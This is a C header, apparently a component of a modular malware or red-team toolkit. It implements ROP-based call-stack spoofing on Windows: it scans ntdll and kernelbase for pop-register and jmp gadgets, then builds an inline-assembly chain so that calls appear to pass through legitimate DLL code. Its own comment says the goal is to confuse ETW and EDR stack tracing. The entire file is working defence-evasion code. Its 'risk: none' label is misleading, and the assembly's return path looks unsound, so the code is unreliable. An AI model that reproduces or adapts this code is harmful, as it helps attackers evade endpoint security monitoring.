// chunk: evasion/stack_spoof_rop
// depends: (none)
// provides: spoof_call
// risk: none
// note: ROP chain-based stack spoofing — builds a mini ROP chain that sets up
//       arguments via pop-register gadgets found in ntdll/kernelbase, then
//       calls the target function. The entire call appears as a chain of returns
//       through legitimate DLL code, confusing ETW and EDR stack tracing.

#ifndef CHUNK_STACK_SPOOF_ROP
#define CHUNK_STACK_SPOOF_ROP

#include <windows.h>

typedef struct {
    PVOID pop_rcx;    /* pop rcx; ret */
    PVOID pop_rdx;    /* pop rdx; ret */
    PVOID pop_r8;     /* pop r8; ret */
    PVOID pop_r9;     /* pop r9; ret */
    PVOID jmp_rax;    /* jmp rax or call rax; ret */
    PVOID ret_gadget; /* plain ret */
} ROP_GADGETS;

static ROP_GADGETS _gadgets = {0};
static int _rop_init = 0;

static PVOID _find_pattern(HMODULE mod, BYTE *pat, int pat_len, DWORD start) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pe);

    for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *base = (BYTE*)mod + sec->VirtualAddress;
        BYTE *end = base + sec->Misc.VirtualSize;
        BYTE *s = base + start;
        if (s >= end) s = base;
        for (BYTE *p = s; p < end - pat_len; p++) {
            int match = 1;
            for (int j = 0; j < pat_len && match; j++) {
                if (pat[j] != 0xCC && p[j] != pat[j]) match = 0;
            }
            if (match) return p;
        }
    }
    return NULL;
}

static void _find_rop_gadgets(void) {
    if (_rop_init) return;

    HMODULE nt = GetModuleHandleA("ntdll.dll");
    HMODULE kb = GetModuleHandleA("kernelbase.dll");
    if (!nt || !kb) return;

    /* pop rcx; ret = 59 C3 */
    BYTE p_rcx[] = {0x59, 0xC3};
    _gadgets.pop_rcx = _find_pattern(nt, p_rcx, 2, 0);
    if (!_gadgets.pop_rcx) _gadgets.pop_rcx = _find_pattern(kb, p_rcx, 2, 0);

    /* pop rdx; ret = 5A C3 */
    BYTE p_rdx[] = {0x5A, 0xC3};
    _gadgets.pop_rdx = _find_pattern(nt, p_rdx, 2, 0);
    if (!_gadgets.pop_rdx) _gadgets.pop_rdx = _find_pattern(kb, p_rdx, 2, 0);

    /* pop r8; ret = 41 58 C3 */
    BYTE p_r8[] = {0x41, 0x58, 0xC3};
    _gadgets.pop_r8 = _find_pattern(nt, p_r8, 3, 0);
    if (!_gadgets.pop_r8) _gadgets.pop_r8 = _find_pattern(kb, p_r8, 3, 0);

    /* pop r9; ret = 41 59 C3 */
    BYTE p_r9[] = {0x41, 0x59, 0xC3};
    _gadgets.pop_r9 = _find_pattern(nt, p_r9, 3, 0);
    if (!_gadgets.pop_r9) _gadgets.pop_r9 = _find_pattern(kb, p_r9, 3, 0);

    /* jmp rax = FF E0 */
    BYTE p_jmp[] = {0xFF, 0xE0};
    _gadgets.jmp_rax = _find_pattern(nt, p_jmp, 2, 0);

    /* plain ret */
    BYTE p_ret[] = {0xC3};
    _gadgets.ret_gadget = _find_pattern(kb, p_ret, 1, 0x100);

    _rop_init = (_gadgets.pop_rcx && _gadgets.pop_rdx && _gadgets.jmp_rax);
}

static PVOID spoof_call(PVOID func, int nargs, ...) {
    _find_rop_gadgets();

    va_list ap;
    va_start(ap, nargs);
    PVOID a0 = nargs > 0 ? va_arg(ap, PVOID) : NULL;
    PVOID a1 = nargs > 1 ? va_arg(ap, PVOID) : NULL;
    PVOID a2 = nargs > 2 ? va_arg(ap, PVOID) : NULL;
    PVOID a3 = nargs > 3 ? va_arg(ap, PVOID) : NULL;
    va_end(ap);

    if (!_rop_init) {
        typedef PVOID (*fn4)(PVOID, PVOID, PVOID, PVOID);
        return ((fn4)func)(a0, a1, a2, a3);
    }

    PVOID result = NULL;

    /* Build ROP chain on the stack:
       [pop rcx; ret] [arg0] [pop rdx; ret] [arg1] [jmp rax]
       with func in rax. Each gadget executes from ntdll/kernelbase address space. */
    __asm__ __volatile__ (
        "mov %%rsp, %%r14\n\t"
        "mov %%rbp, %%r15\n\t"
        "sub $0xC0, %%rsp\n\t"
        "and $0xFFFFFFFFFFFFFFF0, %%rsp\n\t"
        /* Load func into rax for the jmp rax gadget */
        "mov %[fn], %%rax\n\t"
        /* Build chain bottom-up */
        "push %[ret]\n\t"          /* return from the call lands on ret gadget */
        "sub $0x20, %%rsp\n\t"     /* shadow space for the function */
        "push %[jmp_rax]\n\t"     /* jmp rax → calls func */
        /* Set up r9 (arg3) if we have the gadget */
        "cmpq $0, %[pop_r9]\n\t"
        "je 1f\n\t"
        "push %[a3]\n\t"
        "push %[pop_r9]\n\t"
        "1:\n\t"
        /* Set up r8 (arg2) if we have the gadget */
        "cmpq $0, %[pop_r8]\n\t"
        "je 2f\n\t"
        "push %[a2]\n\t"
        "push %[pop_r8]\n\t"
        "2:\n\t"
        /* pop rdx = arg1 */
        "push %[a1]\n\t"
        "push %[pop_rdx]\n\t"
        /* pop rcx = arg0 */
        "push %[a0]\n\t"
        "push %[pop_rcx]\n\t"
        /* Execute the ROP chain by returning into it */
        "ret\n\t"
        "mov %%rax, %[res]\n\t"
        "mov %%r14, %%rsp\n\t"
        "mov %%r15, %%rbp\n\t"
        : [res] "=m"(result)
        : [fn] "r"(func),
          [a0] "r"(a0), [a1] "r"(a1), [a2] "r"(a2), [a3] "r"(a3),
          [pop_rcx] "m"(_gadgets.pop_rcx),
          [pop_rdx] "m"(_gadgets.pop_rdx),
          [pop_r8] "m"(_gadgets.pop_r8),
          [pop_r9] "m"(_gadgets.pop_r9),
          [jmp_rax] "m"(_gadgets.jmp_rax),
          [ret] "m"(_gadgets.ret_gadget)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "r14", "r15", "memory"
    );

    return result;
}

#endif
